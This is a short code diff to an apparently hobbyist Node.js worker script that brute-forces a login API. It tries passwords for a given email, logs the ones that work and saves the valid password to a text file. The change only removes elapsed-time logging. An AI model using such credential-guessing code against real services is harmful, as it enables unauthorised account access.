@@ -7,7 +7,7 @@ import fs from 'fs'
 const fileName='correctPw-BruteForce.txt'
 
 // Get data sent by Worker thread
-const {API_URL,email,passwords,t1} = workerData
+const {API_URL,email,passwords} = workerData
 
 
 async function bruteForceAttack(password){
@@ -25,8 +25,7 @@ async function bruteForceAttack(password){
         })
         // if response with status OK then return true and log the password
         if(response.ok){
-            const t2 = Date.now()
-            console.log(chalk.green.bold(`Login Successfully Email:${email} , Password:${password} valid, time: ${(t2-t1)/1000}s`));
+            console.log(chalk.green.bold(`Login Successfully Email:${email} , Password:${password} valid`));
             fs.writeFileSync(path.resolve(fileName),password,'utf-8')
             process.exit(0)
         }
